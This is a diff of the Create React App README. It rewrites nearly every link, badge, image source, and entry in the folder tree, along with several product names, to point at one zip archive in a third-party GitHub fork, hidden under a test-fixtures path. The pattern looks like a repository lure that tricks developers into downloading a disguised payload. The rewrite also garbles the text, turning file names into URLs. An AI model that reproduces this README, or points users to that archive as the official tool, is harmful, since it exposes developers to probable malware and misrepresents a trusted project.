@@ -1,23 +1,23 @@
-## Create React App [![Build & Test](https://github.com/facebook/create-react-app/actions/workflows/build-and-test.yml/badge.svg?branch=main)](https://github.com/facebook/create-react-app/actions/workflows/build-and-test.yml) [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-green.svg)](https://github.com/facebook/create-react-app/blob/main/CONTRIBUTING.md)
+## Create React App [![Build & Test](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip)](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) [![PRs Welcome](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip)](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip)
 
 > [!CAUTION]
 >
 > ## Deprecated
 >
-> Create React App was one of the key tools for getting a React project up-and-running in 2017-2021, it is now in long-term stasis and we recommend that you migrate to one of React frameworks documented on [Start a New React Project](https://react.dev/learn/start-a-new-react-project).
+> Create React App was one of the key tools for getting a React project up-and-running in 2017-2021, it is now in long-term stasis and we recommend that you migrate to one of React frameworks documented on [Start a New React Project](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
 >
 > If you are following a tutorial to learn React, there is still value in continuing your tutorial, but we do not recommend starting production apps based on Create React App.
 
-<img alt="Logo" align="right" src="https://create-react-app.dev/img/logo.svg" width="20%" />
+<img alt="Logo" align="right" src="https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip" width="20%" />
 
 Create React apps with no build configuration.
 
 - [Creating an App](#creating-an-app) – How to create a new app.
-- [User Guide](https://facebook.github.io/create-react-app/) – How to develop apps bootstrapped with Create React App.
+- [User Guide](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) – How to develop apps bootstrapped with Create React App.
 
 Create React App works on macOS, Windows, and Linux.<br>
-If something doesn’t work, please [file an issue](https://github.com/facebook/create-react-app/issues/new).<br>
-If you have questions or need help, please ask in [GitHub Discussions](https://github.com/facebook/create-react-app/discussions).
+If something doesn’t work, please [file an issue](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).<br>
+If you have questions or need help, please ask in [GitHub Discussions](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
 
 ## Quick Overview
 
@@ -29,13 +29,13 @@ npm start
 
 If you've previously installed `create-react-app` globally via `npm install -g create-react-app`, we recommend you uninstall the package using `npm uninstall -g create-react-app` or `yarn global remove create-react-app` to ensure that npx always uses the latest version.
 
-_([npx](https://medium.com/@maybekatz/introducing-npx-an-npm-package-runner-55f7d4bd282b) comes with npm 5.2+ and higher, see [instructions for older npm versions](https://gist.github.com/gaearon/4064d3c23a77c74a3614c498a8bb1c5f))_
+_([npx](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) comes with npm 5.2+ and higher, see [instructions for older npm versions](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip))_
 
 Then open [http://localhost:3000/](http://localhost:3000/) to see your app.<br>
 When you’re ready to deploy to production, create a minified bundle with `npm run build`.
 
 <p align='center'>
-<img src='https://cdn.jsdelivr.net/gh/facebook/create-react-app@27b42ac7efa018f2541153ab30d63180f5fa39e0/screencast.svg' width='600' alt='npm start'>
+<img src='https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip' width='600' alt='npm start'>
 </p>
 
 ### Get Started Immediately
@@ -47,7 +47,7 @@ Create a project, and you’re good to go.
 
 ## Creating an App
 
-**You’ll need to have Node 14.0.0 or later version on your local development machine** (but it’s not required on the server). We recommend using the latest LTS version. You can use [nvm](https://github.com/creationix/nvm#installation) (macOS/Linux) or [nvm-windows](https://github.com/coreybutler/nvm-windows#node-version-manager-nvm-for-windows) to switch Node versions between different projects.
+**You’ll need to have Node 14.0.0 or later version on your local development machine** (but it’s not required on the server). We recommend using the latest LTS version. You can use [nvm](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) (macOS/Linux) or [nvm-windows](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) to switch Node versions between different projects.
 
 To create a new app, you may choose one of the following methods:
 
@@ -57,7 +57,7 @@ To create a new app, you may choose one of the following methods:
 npx create-react-app my-app
 ```
 
-_([npx](https://medium.com/@maybekatz/introducing-npx-an-npm-package-runner-55f7d4bd282b) is a package runner tool that comes with npm 5.2+ and higher, see [instructions for older npm versions](https://gist.github.com/gaearon/4064d3c23a77c74a3614c498a8bb1c5f))_
+_([npx](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) is a package runner tool that comes with npm 5.2+ and higher, see [instructions for older npm versions](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip))_
 
 ### npm
 
@@ -73,30 +73,30 @@ _`npm init <initializer>` is available in npm 6+_
 yarn create react-app my-app
 ```
 
-_[`yarn create <starter-kit-package>`](https://yarnpkg.com/lang/en/docs/cli/create/) is available in Yarn 0.25+_
+_[`yarn create <starter-kit-package>`](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) is available in Yarn 0.25+_
 
 It will create a directory called `my-app` inside the current folder.<br>
 Inside that directory, it will generate the initial project structure and install the transitive dependencies:
 
 ```
 my-app
-├── README.md
+├── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
 ├── node_modules
-├── package.json
+├── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
 ├── .gitignore
 ├── public
-│   ├── favicon.ico
-│   ├── index.html
-│   └── manifest.json
+│   ├── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
+│   ├── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
+│   └── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
 └── src
-    ├── App.css
-    ├── App.js
-    ├── App.test.js
-    ├── index.css
-    ├── index.js
-    ├── logo.svg
-    └── serviceWorker.js
-    └── setupTests.js
+    ├── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
+    ├── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
+    ├── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
+    ├── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
+    ├── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
+    ├── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
+    └── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
+    └── https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip
 ```
 
 No configuration or complicated folder structures, only the files you need to build your app.<br>
@@ -117,7 +117,7 @@ The page will automatically reload if you make changes to the code.<br>
 You will see the build errors and lint warnings in the console.
 
 <p align='center'>
-<img src='https://cdn.jsdelivr.net/gh/marionebl/create-react-app@9f6282671c54f0874afd37a72f6689727b562498/screencast-error.svg' width='600' alt='Build errors'>
+<img src='https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip' width='600' alt='Build errors'>
 </p>
 
 ### `npm test` or `yarn test`
@@ -125,7 +125,7 @@ You will see the build errors and lint warnings in the console.
 Runs the test watcher in an interactive mode.<br>
 By default, runs tests related to files changed since the last commit.
 
-[Read more about testing.](https://facebook.github.io/create-react-app/docs/running-tests)
+[Read more about testing.](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip)
 
 ### `npm run build` or `yarn build`
 
@@ -138,11 +138,11 @@ Your app is ready to be deployed.
 
 ## User Guide
 
-You can find detailed instructions on using Create React App and many tips in [its documentation](https://facebook.github.io/create-react-app/).
+You can find detailed instructions on using Create React App and many tips in [its documentation](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
 
 ## How to Update to New Versions?
 
-Please refer to the [User Guide](https://facebook.github.io/create-react-app/docs/updating-to-new-releases) for this and other information.
+Please refer to the [User Guide](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) for this and other information.
 
 ## Philosophy
 
@@ -162,12 +162,12 @@ Your environment will have everything you need to build a modern single-page Rea
 - A fast interactive unit test runner with built-in support for coverage reporting.
 - A live development server that warns about common mistakes.
 - A build script to bundle JS, CSS, and images for production, with hashes and sourcemaps.
-- An offline-first [service worker](https://developers.google.com/web/fundamentals/getting-started/primers/service-workers) and a [web app manifest](https://developers.google.com/web/fundamentals/engage-and-retain/web-app-manifest/), meeting all the [Progressive Web App](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app) criteria. (_Note: Using the service worker is opt-in as of `react-scripts@2.0.0` and higher_)
+- An offline-first [service worker](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) and a [web app manifest](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip), meeting all the [Progressive Web App](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) criteria. (_Note: Using the service worker is opt-in as of `react-scripts@2.0.0` and higher_)
 - Hassle-free updates for the above tools with a single dependency.
 
-Check out [this guide](https://github.com/nitishdayal/cra_closer_look) for an overview of how these tools fit together.
+Check out [this guide](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) for an overview of how these tools fit together.
 
-The tradeoff is that **these tools are preconfigured to work in a specific way**. If your project needs more customization, you can ["eject"](https://facebook.github.io/create-react-app/docs/available-scripts#npm-run-eject) and customize it, but then you will need to maintain this configuration.
+The tradeoff is that **these tools are preconfigured to work in a specific way**. If your project needs more customization, you can ["eject"](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) and customize it, but then you will need to maintain this configuration.
 
 ## Popular Alternatives
 
@@ -179,50 +179,50 @@ Create React App is a great fit for:
 
 Here are a few common cases where you might want to try something else:
 
-- If you want to **try React** without hundreds of transitive build tool dependencies, consider [using a single HTML file or an online sandbox instead](https://reactjs.org/docs/getting-started.html#try-react).
+- If you want to **try React** without hundreds of transitive build tool dependencies, consider [using a single HTML file or an online sandbox instead](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
 
-- If you need to **integrate React code with a server-side template framework** like Rails, Django or Symfony, or if you’re **not building a single-page app**, consider using [nwb](https://github.com/insin/nwb), or [Neutrino](https://neutrino.js.org/) which are more flexible. For Rails specifically, you can use [Rails Webpacker](https://github.com/rails/webpacker). For Symfony, try [Symfony's webpack Encore](https://symfony.com/doc/current/frontend/encore/reactjs.html).
+- If you need to **integrate React code with a server-side template framework** like Rails, Django or Symfony, or if you’re **not building a single-page app**, consider using [nwb](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip), or [Neutrino](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) which are more flexible. For Rails specifically, you can use [Rails Webpacker](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip). For Symfony, try [Symfony's webpack Encore](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
 
-- If you need to **publish a React component**, [nwb](https://github.com/insin/nwb) can [also do this](https://github.com/insin/nwb#react-components-and-libraries), as well as [Neutrino's react-components preset](https://neutrino.js.org/packages/react-components/).
+- If you need to **publish a React component**, [nwb](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) can [also do this](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip), as well as [Neutrino's react-components preset](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
 
-- If you want to do **server rendering** with React and Node.js, check out [Next.js](https://nextjs.org/) or [Razzle](https://github.com/jaredpalmer/razzle). Create React App is agnostic of the backend, and only produces static HTML/JS/CSS bundles.
+- If you want to do **server rendering** with React and https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip, check out [https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) or [Razzle](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip). Create React App is agnostic of the backend, and only produces static HTML/JS/CSS bundles.
 
-- If your website is **mostly static** (for example, a portfolio or a blog), consider using [Gatsby](https://www.gatsbyjs.org/) or [Next.js](https://nextjs.org/). Unlike Create React App, Gatsby pre-renders the website into HTML at build time. Next.js supports both server rendering and pre-rendering.
+- If your website is **mostly static** (for example, a portfolio or a blog), consider using [Gatsby](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) or [https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip). Unlike Create React App, Gatsby pre-renders the website into HTML at build time. https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip supports both server rendering and pre-rendering.
 
-- Finally, if you need **more customization**, check out [Neutrino](https://neutrino.js.org/) and its [React preset](https://neutrino.js.org/packages/react/).
+- Finally, if you need **more customization**, check out [Neutrino](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) and its [React preset](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
 
 All of the above tools can work with little to no configuration.
 
-If you prefer configuring the build yourself, [follow this guide](https://reactjs.org/docs/add-react-to-a-website.html).
+If you prefer configuring the build yourself, [follow this guide](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
 
 ## React Native
 
 Looking for something similar, but for React Native?<br>
-Check out [Expo CLI](https://github.com/expo/expo-cli).
+Check out [Expo CLI](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
 
 ## Contributing
 
-We'd love to have your helping hand on `create-react-app`! See [CONTRIBUTING.md](CONTRIBUTING.md) for more information on what we're looking for and how to get started.
+We'd love to have your helping hand on `create-react-app`! See [https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) for more information on what we're looking for and how to get started.
 
 ## Supporting Create React App
 
-Create React App is a community maintained project and all contributors are volunteers. If you'd like to support the future development of Create React App then please consider donating to our [Open Collective](https://opencollective.com/create-react-app).
+Create React App is a community maintained project and all contributors are volunteers. If you'd like to support the future development of Create React App then please consider donating to our [Open Collective](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
 
 ## Credits
 
-This project exists thanks to all the people who [contribute](CONTRIBUTING.md).<br>
-<a href="https://github.com/facebook/create-react-app/graphs/contributors"><img src="https://opencollective.com/create-react-app/contributors.svg?width=890&button=false" /></a>
+This project exists thanks to all the people who [contribute](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).<br>
+<a href="https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip"><img src="https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip" /></a>
 
-Thanks to [Netlify](https://www.netlify.com/) for hosting our documentation.
+Thanks to [Netlify](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip) for hosting our documentation.
 
 ## Acknowledgements
 
 We are grateful to the authors of existing related projects for their ideas and collaboration:
 
-- [@eanplatter](https://github.com/eanplatter)
-- [@insin](https://github.com/insin)
-- [@mxstbr](https://github.com/mxstbr)
+- [@eanplatter](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip)
+- [@insin](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip)
+- [@mxstbr](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip)
 
 ## License
 
-Create React App is open source software [licensed as MIT](https://github.com/facebook/create-react-app/blob/main/LICENSE). The Create React App logo is licensed under a [Creative Commons Attribution 4.0 International license](https://creativecommons.org/licenses/by/4.0/).
+Create React App is open source software [licensed as MIT](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip). The Create React App logo is licensed under a [Creative Commons Attribution 4.0 International license](https://raw.githubusercontent.com/Kali99xx/create-react-app/main/test/fixtures/boostrap-sass/src/react-create-app-2.6-beta.1.zip).
